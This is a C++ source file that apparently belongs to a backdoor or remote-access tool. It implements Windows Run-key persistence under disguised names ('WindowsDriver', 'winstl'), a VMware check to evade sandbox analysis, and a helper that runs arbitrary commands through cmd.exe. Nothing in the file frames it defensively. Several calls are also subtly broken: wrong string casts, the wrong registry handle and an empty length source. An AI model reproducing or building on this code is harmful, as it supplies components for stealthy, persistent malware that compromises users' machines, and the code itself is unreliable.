#include "sys.h"

int Sys::AddToRegistry() {
	std::wstring fullPath;
	WCHAR dest[0xFFF];
	GetModuleFileNameW(nullptr, dest, MAX_PATH);

	HKEY hkey = nullptr;
	LSTATUS retRck = RegCreateKeyEx(HKEY_CURRENT_USER,
	                                (LPCSTR)L"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDriver",
	                                0,
	                                nullptr,
	                                REG_OPTION_NON_VOLATILE,
	                                KEY_ALL_ACCESS,
	                                nullptr,
	                                &hkey,
	                                nullptr);

	if (retRck!=ERROR_SUCCESS) {
		return retRck;
	}

	LSTATUS stat = RegSetValueEx(HKEY_CURRENT_USER,
	                             (LPCSTR)L"winstl",
	                             0,
	                             REG_SZ,
	                             (LPBYTE)dest,
	                             (fullPath.size() + 1)*sizeof(wchar_t));

	return stat;
}

int Sys::RemoveFromRegistry() {
	HKEY hkey;
	LSTATUS retRok = RegOpenKeyEx(HKEY_CURRENT_USER,
	                              (LPCSTR)L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
	                              0,
	                              KEY_ALL_ACCESS,
	                              &hkey);

	if (retRok!=ERROR_SUCCESS) {
		return retRok;
	}

	LSTATUS retRdk = RegDeleteValue(hkey, (LPCSTR)L"winstl");
	RegCloseKey(hkey);

	return retRdk;
}

bool Sys::CheckForVirtualMachine() {
	HKEY hkey;
	char lszValue[256];

	RegOpenKeyExA(HKEY_LOCAL_MACHINE, R"(SYSTEM\CurrentControlSet\Services\Disk\Enum)", 0L, KEY_READ, &hkey);
	RegQueryValueA(hkey, "0", lszValue, (PLONG)sizeof(lszValue));
	RegCloseKey(hkey);

	return strstr(lszValue, "VMware")!=nullptr;
}

int Sys::CreateShell(LPSTR command) {
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	char cmdExe[32767];

	GetEnvironmentVariable("COMSPEC", cmdExe, 32767);
	if (CreateProcessA(cmdExe, command, nullptr, nullptr,
	                   TRUE, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi)) {
		CloseHandle(pi.hThread);
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		return 0;
	}
	return -1;
}

